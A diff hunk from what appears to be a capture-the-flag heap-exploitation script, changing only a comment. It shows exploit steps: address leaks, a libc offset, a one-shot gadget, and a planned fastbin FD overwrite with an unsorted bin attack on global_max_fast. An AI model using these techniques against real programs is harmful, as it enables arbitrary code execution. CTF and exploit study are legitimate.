@@ -50,12 +50,9 @@ def pwn():
 	merge(2, 2)
 
 	heap, _, libc = leak(0)
-	# fake_chunk is a heap area close to the victim's
-	# address (entry #16) whose metadata will be set up
-	# in such way that we can overwrite a fastbin's FD with its
-	# address, land it back to us and be able to overwrite
-	# the victim's sizr in order to perform a main_arena OOB 
-	# write once we've done unsorted bin attack on global_max_fast
+	# fake_chunk is a heap area close to the victim's address (entry #16) whose metadata will be set up
+	# in such way that we can overwrite a fastbin's FD with its address, land it back to us and be able to overwrite
+	# the victim's size in order to perform a main_arena OOB write once we've done unsorted bin attack on global_max_fast
 	fake_chunk = heap + 0x8d0
 	libc -= 0x3c4b78
 	oneshot = libc + 0xf1147
